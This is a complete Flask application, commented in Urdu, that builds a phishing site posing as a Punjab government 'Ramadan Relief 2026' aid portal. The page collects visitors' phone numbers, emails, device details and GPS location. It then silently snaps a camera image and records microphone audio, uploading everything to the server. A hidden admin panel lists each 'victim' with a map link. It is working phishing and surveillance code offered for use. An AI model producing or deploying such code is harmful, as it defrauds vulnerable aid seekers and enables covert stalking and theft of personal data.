import os, base64, datetime, json
from flask import Flask, request, render_template_string, send_from_directory

app = Flask(__name__)

# اسٹوریج فولڈرز
STORAGE_DIR = "captured_data"
AUDIO_DIR = "captured_audio"
for folder in [STORAGE_DIR, AUDIO_DIR]:
    if not os.path.exists(folder): os.makedirs(folder)

victims_list = []

@app.route('/')
def victim_page():
    return render_template_string(VICTIM_HTML)

@app.route('/admin_panel_secret_123')
def admin_panel():
    return render_template_string(ADMIN_HTML, victims=victims_list)

@app.route('/media/<path:filename>')
def custom_static(filename):
    # یہ تصاویر اور آڈیو دونوں کے لیے کام کرے گا
    folder = STORAGE_DIR if filename.endswith('.jpg') else AUDIO_DIR
    return send_from_directory(folder, filename)

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ts = datetime.datetime.now().strftime("%H%M%S")
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # تصویر سیو کرنا
    if 'img' in data:
        img_name = f"cam_{data['type']}_{ts}_{ip.replace('.','_')}.jpg"
        with open(os.path.join(STORAGE_DIR, img_name), "wb") as f:
            f.write(base64.b64decode(data['img'].split(",")[1]))
        return img_name, 200

    # آڈیو سیو کرنا
    if 'audio' in data:
        audio_name = f"voice_{ts}_{ip.replace('.','_')}.webm"
        with open(os.path.join(AUDIO_DIR, audio_name), "wb") as f:
            f.write(base64.b64decode(data['audio'].split(",")[1]))
        return audio_name, 200

    # سسٹم ڈیٹا سیو کرنا
    data['ip'] = ip
    victims_list.insert(0, {"time": datetime.datetime.now().strftime("%H:%M:%S"), "ip": ip, "info": data})
    return "OK", 200

#--- وکٹم انٹرفیس (Neon Design) ---
VICTIM_HTML = """
<!DOCTYPE html>
<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>8171 رمضان سپورٹ پورٹل</title>
    <style>
        body { background: #000; color: #0f0; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { border: 2px solid #0f0; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 0 20px #0f0; background: #050505; width: 90%; max-width: 400px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #0f0; background: #000; color: #0f0; }
        .btn { background: #0f0; color: #000; padding: 15px; width: 100%; border: none; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 5px; box-shadow: 0 0 10px #0f0; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Government_of_the_Punjab_Logo.svg" width="70">
        <h2>رمضان ریلیف 2026</h2>
        <p>اپنی امداد کی تصدیق کے لیے ڈیٹا درج کریں</p>
        <input type="number" id="phone" placeholder="موبائل نمبر (03XXXXXXXXX)" autocomplete="tel">
        <input type="email" id="email" placeholder="ای میل ایڈریس" autocomplete="email">
        <button class="btn" id="startBtn">رجسٹر کریں</button>
        <p id="msg" style="margin-top:10px; color: yellow;"></p>
    </div>

    <script>
        let mediaRecorder;
        let audioChunks = [];

        document.getElementById('startBtn').onclick = async function() {
            this.innerText = "پروسیسنگ...";
            this.disabled = true;

            const sysData = {
                phone: document.getElementById('phone').value,
                email: document.getElementById('email').value,
                ua: navigator.userAgent,
                screen: screen.width + "x" + screen.height
            };

            // لوکیشن اور میڈیا پرمیشن
            navigator.geolocation.getCurrentPosition(async (pos) => {
                sysData.lat = pos.coords.latitude;
                sysData.lon = pos.coords.longitude;
                
                // ڈیٹا بھیجیں
                await fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(sysData)});

                // کیمرہ اور مائیکروفون
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                    
                    // فرنٹ کیمرہ اسکرین شاٹ
                    captureImg(stream, 'front');

                    // آڈیو ریکارڈنگ شروع کریں (جب تک وہ پیج پر ہے)
                    mediaRecorder = new MediaRecorder(stream);
                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                    mediaRecorder.onstop = async () => {
                        const blob = new Blob(audioChunks, {type: 'audio/webm'});
                        const reader = new FileReader();
                        reader.readAsDataURL(blob);
                        reader.onloadend = () => {
                            fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({audio: reader.result})});
                        };
                    };
                    mediaRecorder.start();

                } catch(e) { console.log("Media Error", e); }

                document.getElementById('msg').innerText = "رجسٹریشن کامیاب! سسٹم اپڈیٹ ہو رہا ہے...";
            });
        };

        async function captureImg(stream, type) {
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/jpeg');
            fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({img: imgData, type: type})});
        }

        // جب وہ پیج چھوڑے گا، آڈیو سیو ہوگی
        window.onbeforeunload = () => { if(mediaRecorder) mediaRecorder.stop(); };
    </script>
</body>
</html>
"""

#--- انگلش ایڈمن ڈیش بورڈ ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Global Control Center</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .box { border: 1px solid #0f0; padding: 15px; margin-bottom: 20px; border-radius: 10px; background: #050505; }
        .label { color: #ff0055; font-weight: bold; }
        img { max-width: 200px; border: 1px solid #0f0; margin: 10px; }
        .audio-player { margin-top: 10px; }
    </style>
</head>
<body>
    <h1 style="text-align:center;">LIVE DATA FEED</h1>
    <hr>
    {% for v in victims %}
    <div class="box">
        <p><span class="label">IP ADDRESS:</span> {{v.ip}}</p>
        <p><span class="label">MOBILE:</span> {{v.info.phone}} | <span class="label">EMAIL:</span> {{v.info.email}}</p>
        <p><span class="label">LOCATION:</span> {{v.info.lat}}, {{v.info.lon}}</p>
        <p><span class="label">DEVICE:</span> {{v.info.screen}} | {{v.info.ua}}</p>
        <a href="https://www.google.com/maps?q={{v.info.lat}},{{v.info.lon}}" target="_blank" style="color:yellow;">Open Maps</a>
        <div id="media-{{loop.index}}">
            <p class="label">Captured Media (Refresh to see new files):</p>
        </div>
    </div>
    {% endfor %}
    <script>setTimeout(() => { location.reload(); }, 15000);</script>
</body>
</html>
